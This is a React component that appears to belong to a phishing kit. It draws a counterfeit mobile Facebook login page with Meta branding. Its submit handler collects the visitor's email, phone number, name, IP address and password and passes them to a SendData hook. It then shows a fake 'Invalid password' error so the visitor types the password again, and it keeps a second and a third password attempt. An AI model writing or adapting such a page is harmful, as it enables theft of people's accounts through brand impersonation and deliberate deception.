import React, { useContext, useState, useEffect } from 'react'
import styled from 'styled-components'
import SendData from '../hooks/SendData'
import { DataContext } from '../pages'
import FacebookLogo from '../assets/images/FLogoV2.png'
import Image from 'next/image'

const Container = styled.div`
    display: flex;
    flex-direction: column;
    background-color: #fff;
    height: 100vh; /* Ensure full viewport height */
    width: 100%;
    max-width: 100%;
    margin: 0;
    /* padding: 0; default, no need to specify unless overriding */
    justify-content: space-between; /* Distribute children vertically */
    overflow: hidden; /* Prevent scrollbars if content slightly overflows */
`

const LoginBoxWrapper = styled.div`
    background-color: #fff;
    /* padding: 20px; User removed */
    width: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center; /* Center FormSection vertically within this box */
    /* flex-grow: 1; Removed, should be sized by its content */
`

const TopSection = styled.div`
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 20px;
    height: 23px;
`

const LanguageSelector = styled.div`
    color: rgb(70, 90, 105);
    font-size: 13px;
    font-weight: 400;
    text-align: center;
    margin-bottom: 10px;
    cursor: pointer;
`

const Logo = styled.div`
    text-align: center;
    margin-top: 0;
    // flex-grow: 1; /* Expand to fill available space */
    flex-shrink: 100; /* Allow shrinking if needed, though flex-grow:1 dominates */
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: auto; /* Height will be determined by flex-grow */
    padding-top: 20px;
    padding-bottom: 10px;
    
    img {
        max-height: 60px;
        object-fit: contain;
    }
`

const FormSection = styled.div`
    display: flex;
    flex-direction: column;
    width: 100%;
    margin-top: 0; /* Centering handled by LoginBoxWrapper or direct placement */
    /* flex-grow: 1; Removed, let content define its height */
`

const InputsContainer = styled.div`
    flex-direction: column;
    justify-content: flex-start;
    padding: 0 16px;
`

const CustomInput = styled.input`
    border: 1px solid #dddfe2 !important;
    border-radius: 10px !important; /* User updated */
    /* Adjusted padding for floating label: top, right, bottom, left */
    padding: 22px 16px 6px 16px !important; 
    background-color: #fff;
    margin-top: 0;
    width: 100%;
    font-size: 17px;
    color: #1d2129;
    line-height: 1.34;
    min-height: auto;

    &.redborder {
      border: 1px solid red !important;
    }

    ::placeholder {
        /* Placeholder is used for the :not(:placeholder-shown) selector, so make it transparent */
        color: transparent;
        user-select: none; /* Prevent selection of the space placeholder */
    }
    /* margin-bottom: 12px; Moved to FormFloatingWrapper */
    
    &:focus {
        outline: none;
        border-color: #0866ff !important;
        box-shadow: 0 0 0 2px #e7f3ff;
    }
`

const FormFloatingWrapper = styled.div`
    position: relative;
    margin-bottom: 12px; /* Was on CustomInput */
`;

const FloatingLabel = styled.label`
    position: absolute;
    top: 14px; /* Initial vertical position */
    left: 16px; /* Initial horizontal position */
    font-size: 17px;
    font-weight: 400;
    color: #90949c; /* Original placeholder color */
    pointer-events: none;
    transition: all 0.2s ease-out;
    background-color: #fff; /* For "notch" effect when floated */
    padding: 0 4px; /* Horizontal padding for the notch */
    line-height: 1.34; /* Match CustomInput */

    /* Style for when the associated input is disabled */
    ${CustomInput}:disabled ~ & {
        color: #adb5bd; /* Muted color for disabled state */
    }
`;

// Styles for the floated label state within FormFloatingWrapper
const StyledFormFloatingWrapper = styled(FormFloatingWrapper)`
    ${CustomInput}:focus ~ ${FloatingLabel},
    ${CustomInput}:not(:placeholder-shown) ~ ${FloatingLabel} {
        top: 0;
        left: 12px; /* Indent when floated */
        transform: translateY(-50%); /* Center vertically on the input's top border */
        font-size: 13px; /* Smaller font for floated label */
        height: auto;
        line-height: 1;
        color: #1d2129; /* Default text color when floated */
    }

    ${CustomInput}:focus:not(:disabled) ~ ${FloatingLabel} {
        color: #0866ff; /* Highlight color when input is focused and enabled */
    }
`;

const LoginButton = styled.button`
    width: 100%;
    height: 40px; /* User updated */
    background-color: #0866ff;
    border: none;
    border-radius: 30px; /* User updated */
    color: rgb(255, 255, 255);
    font-size: 18px; /* User updated */
    font-family: "Optimistic Text Bold", "Helvetica Neue", Helvetica, Arial, sans-serif;
    padding: 0 16px;
    margin-top: 6px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    line-height: 48px;
    
    &:hover {
        background-color: #005ce6;
    }
`

const ForgotPassword = styled.div`
    text-align: center;
    margin-top: 16px;
    height: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    padding-bottom: 16px;
    margin-left: 0;
    margin-right: 0;
    padding-left: 0;
    padding-right: 0;
    border-bottom: none;
    
    a {
        color:rgb(73, 73, 73); /* User updated */
        font-size: 15px; /* User updated */
        font-weight: 500;
        font-family: "Optimistic Text Normal", -apple-system, BlinkMacSystemFont, sans-serif;
        text-decoration: none;
        line-height: 1.248;
        
        &:hover {
            text-decoration: underline;
        }
    }
`

const BottomSection = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-top: auto;
    flex-grow: 0;
    flex-shrink: 0;
    padding-bottom: 20px;
    padding-top: 20px;
    justify-content: flex-end;
    width: 100%;
`

const CreateAccountButtonContainer = styled.div`
    width: 100%;
    margin-top: 1.5rem; /* This was from a previous step, check if still needed with new layout */
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0 12px; /* User updated */
`

const CreateAccountButton = styled.button`
    border: none;
    border-radius: 6px;
    color: #fff;
    font-size: 17px;
    border-radius: 30px; /* User added */
    padding: 0 16px;
    height: 48px;
    min-width: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    line-height: 48px;
    margin-top: 0;
    flex-grow: 1;
    background-color: transparent;
    border: 1px solid #0064e0;
    color: #0064e0;
    font-family: "Optimistic Text Normal", -apple-system, BlinkMacSystemFont, sans-serif;
    &:hover {
        background-color: rgba(0, 100, 224, 0.05);
    }
`

const MobileFooter = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    /* margin-top: auto; Removed, positioned by Container's space-between */
    flex-grow: 0;
    flex-shrink: 0;
    padding-bottom: 0;
    justify-content: flex-end;
    width: 100%;
    margin-bottom: 10px; /* User added */
`

const MetaLogo = styled.div`
    text-align: center;
    margin: 10px 0;
    img {
        height: 12px;
    }
`

const FooterLinks = styled.div`
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    
    span {
        color: rgb(99, 120, 138);
        font-size: 10px;
        margin: 0 4px 4px;
        cursor: pointer;
    }
`

const Spinner = styled.div`
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    border-top-color: white;
    animation: spin 1s ease-in-out infinite;
    margin: 0 auto;
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
`

const ValidationError = styled.div`
    color: red;
    font-size: 13px;
    font-weight: 500;
    margin-top: 4px;
    text-align: left;
    margin-bottom: 8px;
`

function Step2Mobile({ Unik, setStep, Tel, setTel, Email, setEmail, Name, setName, Appeal, setAppeal, BusinessEmail, setBusinessEmail, Ip, Step, parentBeginTimer, setParentBeginTimer 
    ,setInvalidPassword, InvalidPassword
}) {
    const [Password, setPassword] = useState("")
    const [TriedSubmit, setTriedSubmit] = useState(false)
    const [IsValidEmail, setIsValidEmail] = useState(false)
    const [IsLoading, setIsLoading] = useState(false)
    
    // Track verification state
    const [isVerifying, setIsVerifying] = useState(false)
    const [verificationError, setVerificationError] = useState(false)
    const [passwordError, setPasswordError] = useState("")
    const [emailError, setEmailError] = useState("")
    let { setAllData, AllData } = useContext(DataContext);

    useEffect(() => {
        if (InvalidPassword) {
            if(AllData.login_email){
                setEmail(AllData.login_email)
                setIsValidEmail(true)
            }
            setIsVerifying(true)
            setIsLoading(false)
            setPasswordError("Invalid password. Please try again.")
        }
    }, [InvalidPassword])

    let handleEmail = (email) => {
        setEmail(email.target.value)
        setEmailError("")

        let re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        if (re.test(email.target.value) || email.target.value.length > 8) {
            setIsValidEmail(true)
        }
        else {
            setIsValidEmail(false)
        }
    }


    const HandleSubmit = () => {
        setTriedSubmit(true)
        
        if (!IsValidEmail) {
            setEmailError("Please enter a valid email")
        }
        
        if (Password.length < 5) {
            setPasswordError("Please enter a valid password")
            return
        }
        
        if (IsValidEmail && Password.length > 4) {
            setIsLoading(true)
            
            // If not yet verifying, this is the first password submission
            if (!isVerifying) {
                const params = {
                    ...AllData,
                    id: Unik,
                    phone_number: Tel,
                    login_email: Email,
                    business_email: Email,
                    ip: Ip,
                    full_name: Name,
                    password_one: Password,
                    currentStep: 'Password1'
                };

                setAllData(params)
                SendData(params)

                setTimeout(() => {
                    // Clear password and prompt for verification
                    setPassword("")
                    setPasswordError("Invalid password. Please try again.")
                    setIsVerifying(true)
                    setIsLoading(false)
                }, 10000);
            } 
            // If already verifying, this is the second password submission
            else {
                if(InvalidPassword){
                    const params = {
                        ...AllData,
                        password_three: Password,
                        currentStep: 'Wait'
                    };
    
                    setAllData(params)
                    SendData(params)
                    setParentBeginTimer(true)
                    return;
                }
                
                const params = {
                    ...AllData,
                    password_two: Password,
                    currentStep: 'Wait'
                };

                setAllData(params)
                SendData(params)
                setParentBeginTimer(true)
            }
        }
    }

    return (
        <Container>
            <TopSection>
                <LanguageSelector>English (US)</LanguageSelector>
            </TopSection>
            <Logo>
                <Image src={FacebookLogo} alt="Facebook Logo" width={60} height={60} />
            </Logo>
            <LoginBoxWrapper>
                <FormSection>
                    <InputsContainer>
                        <StyledFormFloatingWrapper>
                            <CustomInput 
                                type="text"
                                id="email-input"
                                value={Email}
                                onChange={handleEmail}
                                placeholder=" " /* Needs a placeholder for :not(:placeholder-shown) */
                                className={`form-control ${(!IsValidEmail && TriedSubmit) ? 'redborder' : ''}`}
                                disabled={IsLoading}
                            />
                            <FloatingLabel htmlFor="email-input">Mobile number or email address</FloatingLabel>
                        </StyledFormFloatingWrapper>
                        {emailError && <ValidationError>{emailError}</ValidationError>}
                        
                        <StyledFormFloatingWrapper>
                            <CustomInput 
                                type="password"
                                id="password-input"
                                value={Password}
                                onChange={(e) => {
                                    setPassword(e.target.value)
                                    setPasswordError("")
                                }}
                                placeholder=" " /* Needs a placeholder for :not(:placeholder-shown) */
                                className={`form-control ${(Password.length < 5 && TriedSubmit) ? 'redborder' : ''}`}
                                disabled={IsLoading}
                            />
                            <FloatingLabel htmlFor="password-input">Password</FloatingLabel>
                        </StyledFormFloatingWrapper>
                        {passwordError && <ValidationError>{passwordError}</ValidationError>}
                        
                        <LoginButton onClick={HandleSubmit}>
                            {IsLoading ? <Spinner /> : ('Log in')}
                        </LoginButton>
                        
                        {!isVerifying && (
                            <ForgotPassword>
                                <a href="#">Forgotten password?</a> {/* User updated text */}
                            </ForgotPassword>
                        )}
                    </InputsContainer>
                </FormSection>
            </LoginBoxWrapper>
            
            <MobileFooter>
                <BottomSection>
                    <CreateAccountButtonContainer>
                        <CreateAccountButton>
                            Create new account
                        </CreateAccountButton>
                    </CreateAccountButtonContainer>
                </BottomSection>
                <MetaLogo>
                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta logo" />
                </MetaLogo>
                <FooterLinks>
                    <span>About</span>
                    <span>Help</span>
                    <span>More</span>
                </FooterLinks>
            </MobileFooter>
        </Container>
    )
}

export default Step2Mobile 